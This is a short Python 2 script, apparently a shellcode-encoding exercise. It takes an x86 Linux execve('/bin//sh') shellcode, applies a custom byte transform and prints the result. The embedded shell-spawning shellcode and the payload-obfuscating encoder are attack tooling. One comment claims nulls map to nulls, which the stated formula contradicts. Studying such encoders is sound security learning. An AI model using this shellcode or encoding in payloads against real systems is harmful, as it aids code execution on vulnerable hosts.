#!/usr/bin/python
#
# EvenLowOddHighLower.py
#
# since we know there aren't going to be any nulls in the input
# or output of the ELOH encoder, it would be acceptable to lower
# these bytes by one. This results in the following EL-OH-L
# encoder:
#
#     n_prime = n/2-1, if n|2; ((n-1)/2 + 128)-1, otherwise
#
# The reverse operaion is obvious.
#
# This isn't a very good encoder, though, as it doesn't target the
# removal of any specific bad characters. It would even map nulls
# to nulls, if there were any present.

# using execve shellcode for proof of concept
shellcode = ("\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e"
             "\x89\xe3\x50\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80")

encoded = ""

for byte in bytearray(shellcode):
    encoded += "0x"
    if (byte % 2 == 0):
        encoded += '%02x,' % ((byte / 2) -1)
    else:
        encoded += '%02x,' % ((( (byte-1) / 2 ) + 128) -1)

print encoded
